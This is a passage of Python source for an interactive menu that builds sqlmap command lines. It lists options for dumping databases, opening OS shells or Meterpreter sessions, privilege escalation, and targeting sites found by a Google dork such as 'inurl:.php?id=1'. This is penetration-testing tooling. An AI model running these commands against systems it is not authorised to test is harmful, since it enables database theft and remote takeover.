        self._enumeration.append(Argument('--privileges', 'Enumerate DBMS users privileges', '', '', isBool=True))
        self._enumeration.append(Argument('--roles', 'Enumerate DBMS users roles', '', '', isBool=True))
        self._enumeration.append(Argument('--dbs', 'Enumerate DBMS databases', '', '', isBool=True))
        self._enumeration.append(Argument('--tables', 'Enumerate DBMS database tables', '', '', isBool=True))
        self._enumeration.append(Argument('--columns', 'Enumerate DBMS database table columns', '', '', isBool=True))
        self._enumeration.append(Argument('--schema', 'Enumerate DBMS schema', '', '', isBool=True))
        self._enumeration.append(Argument('--count', 'Retrieve number of entries for table(s)', '', '', isBool=True))
        self._enumeration.append(Argument('--dump', 'Dump DBMS database table entries', '', '', isBool=True))
        self._enumeration.append(Argument('--dump-all', 'Dump all DBMS databases tables entries', '', '', isBool=True))
        self._enumeration.append(Argument('--search', 'Search column(s), table(s) and/or database name(s)', '', '', isBool=True))
        self._enumeration.append(Argument('--comments', 'Retrieve DBMS comments', '', '', isBool=True))
        self._enumeration.append(Argument('-D', 'DBMS database to enumerate'))
        self._enumeration.append(Argument('-T', 'DBMS database table(s) to enumerate'))
        self._enumeration.append(Argument('-C', 'DBMS database table column(s) to enumerate'))
        self._enumeration.append(Argument('-X', 'DBMS database table column(s) to not enumerate'))
        self._enumeration.append(Argument('-U', 'DBMS user to enumerate'))
        self._enumeration.append(Argument('--exclude-sysdbs', 'Exclude DBMS system databases when enumerating tables', '', '', isBool=True))
        self._enumeration.append(Argument('--pivot-column', 'Pivot column name'))
        self._enumeration.append(Argument('--where', 'Use WHERE condition while table dumping'))
        self._enumeration.append(Argument('--start', 'First dump table entry to retrieve'))
        self._enumeration.append(Argument('--stop', 'Last dump table entry to retrieve'))
        self._enumeration.append(Argument('--first', 'First query output word character to retrieve'))
        self._enumeration.append(Argument('--last', 'Last query output word character to retrieve'))
        self._enumeration.append(Argument('--sql-query', 'SQL statement to be executed'))
        self._enumeration.append(Argument('--sql-shell', 'Prompt for an interactive SQL shell', '', '', isBool=True))
        self._enumeration.append(Argument('--sql-file', 'Execute SQL statements from given file(s)'))

        self._bruteforce = []
        self._bruteforce.append(Argument('--common-tables', 'Check existence of common tables', '', '', isBool=True))
        self._bruteforce.append(Argument('--common-columns', 'Check existence of common columns', '', '', isBool=True))

        self._os = []
        self._os.append(Argument('--os-cmd', 'Execute an operating system command'))
        self._os.append(Argument('--os-shell', 'Prompt for an interactive operating system shell', '', '', isBool=True))
        self._os.append(Argument('--os-pwn', 'Prompt for an OOB shell, Meterpreter or VNC', '', '', isBool=True))
        self._os.append(Argument('--os-smbrelay', 'One click prompt for an OOB shell, Meterpreter or VNC', '', '', isBool=True))
        self._os.append(Argument('--os-bof', 'Stored procedure buffer overflow exploitation', '', '', isBool=True))
        self._os.append(Argument('--priv-esc', 'Database process user privilege escalation', '', '', isBool=True))
        self._os.append(Argument('--msf-path', 'Local path where Metasploit Framework is installed'))
        self._os.append(Argument('--tmp-path', 'Remote absolute path of temporary files directory'))

        self._general = []
        self._general.append(Argument('-s', 'Load session from a stored (.sqlite) file'))
        self._general.append(Argument('-t', 'Log all HTTP traffic into a textual file'))
        self._general.append(Argument('--batch', 'Never ask for user input, use the default behaviour', '', '', isBool=True))
        self._general.append(Argument('--binary-fields', 'Result fields having binary values (e.g. "digest")'))
        self._general.append(Argument('--check-internet', 'Check Internet connection before assessing the target', '', '', isBool=True))
        self._general.append(Argument('--crawl', 'Crawl the website starting from the target URL'))
        self._general.append(Argument('--crawl-exclude', 'Regexp to exclude pages from crawling (e.g. "logout")'))
        self._general.append(Argument('--csv-del', 'Delimiting character used in CSV output (default ",")'))
        self._general.append(Argument('--charset', 'Blind SQL injection charset (e.g. "0123456789abcdef")'))
        self._general.append(Argument('--dump-format', 'Format of dumped data (CSV (default), HTML or SQLITE)'))
        self._general.append(Argument('--encoding', 'Character encoding used for data retrieval (e.g. GBK)'))
        self._general.append(Argument('--eta', 'Display for each output the estimated time of arrival', '', '', isBool=True))
        self._general.append(Argument('--flush-session', 'Flush session files for current target', '', '', isBool=True))
        self._general.append(Argument('--forms', 'Parse and test forms on target URL', '', '', isBool=True))
        self._general.append(Argument('--fresh-queries', 'Ignore query results stored in session file', '', '', isBool=True))
        self._general.append(Argument('--har', 'Log all HTTP traffic into a HAR file'))
        self._general.append(Argument('--hex', 'Use DBMS hex function(s) for data retrieval', '', '', isBool=True))
        self._general.append(Argument('--output-dir', 'Custom output directory path'))
        self._general.append(Argument('--parse-errors', 'Parse and display DBMS error messages from responses', '', '', isBool=True))
        self._general.append(Argument('--save', 'Save options to a configuration INI file'))
        self._general.append(Argument('--scope', 'Regexp to filter targets from provided proxy log'))
        self._general.append(Argument('--test-filter', 'Select tests by payloads and/or titles (e.g. ROW)'))
        self._general.append(Argument('--test-skip', 'Skip tests by payloads and/or titles (e.g. BENCHMARK)'))
        self._general.append(Argument('--update', 'Update sqlmap'))

        return

    def __repr__(self):
        return super().__repr__()

    def __str__(self):
        return super().__str__()

    def selectTarget(self):
        result = True

        print(MenuBase.TITLE + 'Select target type:' + MenuBase.ENDC)
        print('1 = Direct connection to the database')
        print('2 = Target URL')
        print('3 = Parse targets from Burp proxy logs (external use)')
        print('4 = Parse targets from remote sitemap(.xml) file')
        print('5 = Scan multiple targets enlisted in a given textual file')
        print('6 = Load HTTP request from a file')
        print('7 = Process Google dork results as target addresses')
        print('8 = Load options from a configuration INI file')
        print('Anything else to exit')
        print('> ', end = '')
        choice = input()

        if choice == '1':
            print('Run sqlmap against a single database instance. This option accepts a connection string in one of following forms:')
            print('DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)')
            print('DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.)')
            print('python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users')
            print('Do not put quotes > ', end = '')
            choice = input()
            self._cmd += '-d "' + choice + '" '
        elif choice == '2':
            print('Run sqlmap against a single target URL. This option requires a target URL in following form:')
            print('http(s)://targeturl[:port]/[...]')
            print('python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users')
            print('Do not put quotes > ', end = '')
            choice = input()
            self._cmd += '-u "' + choice + '" '
        elif choice == '3':
            print('Burp Suite plugin: https://github.com/codewatchorg/sqlipy')
            print('Instructions on how to integrate SQLMap with Burp Suite: https://support.portswigger.net/customer/portal/articles/2791040-using-burp-with-sqlmap')
            self._cmd = None
        elif choice == '4':
            print('Enter sitemap URL (e.g. http://www.target.com/sitemap.xml) > ', end = '')
            choice = input()
            self._cmd += '-x "' + choice + '" '
        elif choice == '5':
            print('Enter file name > ', end = '')
            choice = input()
            self._cmd += '-m ' + choice + ' '
        elif choice == '6':
            print('Example:')
            print('POST /vuln.php HTTP/1.1 \nHost: www.target.com \nUser-Agent: Mozilla/4.0\n\nid=1')
            print('Enter file name with the HTTP header request in it > ', end = '')
            choice = input()
            self._cmd += '-r ' + choice + ' '
        elif choice == '7':
            print('Example:')
            print('inurl:\".php?id=1\"')
            print('Enter dork pattern > ', end = '')
            choice = input()
            self._cmd += '-g "' + choice + '" '
        elif choice == '8':
            print('Enter INI file name > ', end = '')
            choice = input()
            self._cmd += '-c ' + choice + ' '
        else:
            result = False

        return result

    def selectFromArray(self, arry, title):
        result = True

        while True:
            Utility.resetScreen()
            print(MenuBase.TITLE + title + MenuBase.ENDC)
            print(MenuBase.CMD + self._args + MenuBase.ENDC)
            count = 1
            for arg in arry:
                print(str(count) + ': ' + arg._option + ' - ' + arg._description)
                count += 1

            print()
            print()
            print('Choose wisely: (Empty to return) > ', end = '')
            choice = input()

            if choice == '':
                return True
            else:
                index = int(choice) - 1

                if arry[index]._isBool == True:
                    arry[index]._value = ''
                else:
                    print('Enter value for: ' + arry[index]._option + ' > ', end = '')
                    arry[index]._value = input()

                self._args += ' ' + arry[index]._option + arry[index]._delim + arry[index]._value     
            
        return result

    def run(self, **args):
        import Screen

        self._cmd = 'sqlmap '
        if self.selectTarget() == False:
            return
        
        if self.selectFromArray(self._requests, 'Requests:') == False:
            return

        if self.selectFromArray(self._optimizations, 'Optimizations:') == False:
            return

        if self.selectFromArray(self._injections, 'Injections:') == False:
            return

        if self.selectFromArray(self._techniques, 'Techniques:') == False:
            return

        if self.selectFromArray(self._fingerprint, 'Fingerprint:') == False:
            return

        if self.selectFromArray(self._enumeration, 'Enumeration:') == False:
            return

        if self.selectFromArray(self._bruteforce, 'Bruteforce:') == False:
            return

        if self.selectFromArray(self._os, 'OS:') == False:
            return

        if self.selectFromArray(self._general, 'General:') == False:
            return

        self._cmd += self._args
        self._cmd += ' | tee ' + session.getExploitDir() + '/sqlmap.out'
        session.runThreadedCmd(self._cmd, 'SQLMap')
        session.screen.showMenu()
        return
        
        
